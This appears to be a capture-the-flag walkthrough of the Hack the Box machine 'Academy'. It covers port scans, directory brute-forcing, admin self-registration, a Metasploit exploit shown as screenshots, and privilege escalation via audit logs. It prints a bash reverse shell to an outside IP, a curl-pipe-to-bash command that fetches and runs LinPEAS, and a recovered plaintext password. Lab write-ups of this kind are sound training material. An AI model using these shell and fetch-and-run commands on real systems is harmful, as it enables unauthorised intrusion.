# NMAP
```CSS
▶ nmap -Pn -sS -p- -T4 --min-rate 1000 10.10.10.215

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 10:48 IST
Nmap scan report for 10.10.10.215
Host is up (0.25s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 70.45 seconds
```
```CSS
nmap -sC -sV -T4 --min-rate 1000 -p 22,80,33060 10.10.10.215

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 10:56 IST           
Nmap scan report for 10.10.10.215                                                    
Host is up (0.24s latency).                                                          
                                                                                     
PORT      STATE SERVICE VERSION                                                      
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                       
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)            
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)           
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)         
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))                    
|_http-server-header: Apache/2.4.41 (Ubuntu)                              
|_http-title: Did not follow redirect to http://academy.htb/              
33060/tcp open  mysqlx?                                                              
| fingerprint-strings:                                                               
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"                                                               
|_    HY000                                                                          
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
:                                                                                    
SF-Port33060-TCP:V=7.94%I=7%D=8/3%Time=64CB3A88%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000"
SF:)%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                                                     
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.41 seconds
```

# HTTP-80
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b666dcb7-0daf-4fde-992b-31407d91f5a7)

# Directory and File Brute-Force
```CSS
▶ gobuster dir --url http://academy.htb --extensions php --wordlist raft-medium-directories.txt

===============================================================                                                                                                            
Gobuster v3.5                                                                                                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                              
===============================================================                                                                                                            
[+] Url:                     http://academy.htb                                                                                                                            
[+] Method:                  GET
[+] Threads:                 5                                                                                                                                             
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt                                                               
[+] Negative Status codes:   404                                                                                                                                           
[+] User Agent:              gobuster/3.5                                                                                                                                  
[+] Extensions:              php                                                                                                                                           
[+] Timeout:                 10s                                                                                                                                           ===============================================================                                                                                                            
2023/08/03 11:30:32 Starting gobuster in directory enumeration mode                                                                                                        
===============================================================                                                                                                            
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]                                                                                           
/admin.php            (Status: 200) [Size: 2633]                                                                                                                           
/register.php         (Status: 200) [Size: 3003]                                                                                                                           
/login.php            (Status: 200) [Size: 2627]                                                                                                                           
/config.php           (Status: 200) [Size: 0]                                                                                                                              
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/index.php            (Status: 200) [Size: 2117]          
```
# Register as User
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d1a301dc-c230-4f25-9a2b-fdd0e5f0a0fb)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bfda213b-da7f-426f-a939-5eaed9228bc3)
# Login
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9c5f7937-5861-41b4-b118-f4bdee5ff6c7)
# User Dashboard
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6d632e69-0a50-4e7d-8180-c6c8fdbe0510)
# Register as Admin
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/56fc49e3-0fc6-4bd8-85b9-6afbac9d0c2a)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b7b2ffb-4497-4b45-8b42-f83fb7859704)
# Login
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c792546c-9aee-4a27-b9b4-d17a32e138ee)
# Admin Page
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/46732760-b24d-4c69-a088-5afd136e69b1)
# Error Page
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad4c8c30-b309-41a8-93c7-da658733df47)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dd0a38a4-f0d6-40e1-b913-857e2cd68eff)
# Searchsploit
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/179e8926-8ed4-442b-9ffc-ddfd004b63d4)
# Metasploit
```CSS
▶ sudo msfdb run
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cac2a074-606e-4cf1-a32b-6d73255d6e8f)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ee9ba94e-1287-4ea6-a4d1-573b14348e51)
# Reverse Shell
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a0470a49-5b21-4d54-92bf-ed1723809e95)
# Shell Upgrade
```CSS
bash -c 'bash -i >& /dev/tcp/10.10.14.85/9001 0>&1'
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2a984763-6024-4ff5-b6f8-f37a64b505f7)
# Searching for Info
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/509032b0-9215-4e5c-bf8b-455c1c7094e3)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ec3a54d8-6cb2-4fb2-a7cb-7fed9f81c1d4)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/881c6f7d-590c-4624-99dc-de223e6d9169)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4e8fcdc6-55e1-45f8-ae8f-8f76dd7ded72)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/973201b0-4f2b-42e8-95c5-af98ede1c6d2)
# Shell as cry0l1t3
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e746c9ba-ee46-43b2-8ee4-eab63a7e0f2e)
# List of Users (Not Required)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf5fe75b-fcff-4f91-bbf2-115df6a5d616)
# SSH login as cry0l1t3
```CSS
▶ ssh cry0l1t3@10.10.10.215
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c873204a-0966-46ae-87ac-5b58310623d6)
# LinPEAS
  - Start python server to curl LinPEAS on academy.
  - Curl and execute LinPEAS.
```CSS
$ curl http://10.10.14.85:8000/linpeas.sh | bash
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/28c32697-9912-423f-be16-9cafaa9dd3eb)

# Privilege Escalation
Group `adm` is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. Since the current user is a member of the `adm` group its a good idea to have a look at the logs (`/var/logs`).

# Logs
```CSS
$ aureport --tty
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/36c12e1b-b565-4189-89c4-2a85895d964b)
- That is just decoding what’s in these lines from /var/log/audit/audit.log.3

# Shell as mrb3n
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/838bfc07-85e6-4bcb-8911-6d22b021221a)
- Upgrade shell or ssh for a new shell as nrb3n.
```CSS
$ /bin/bash -i
```
```
▶ ssh mrb3n@10.10.10.215
```
Password: mrb3n_Ac@d3my!

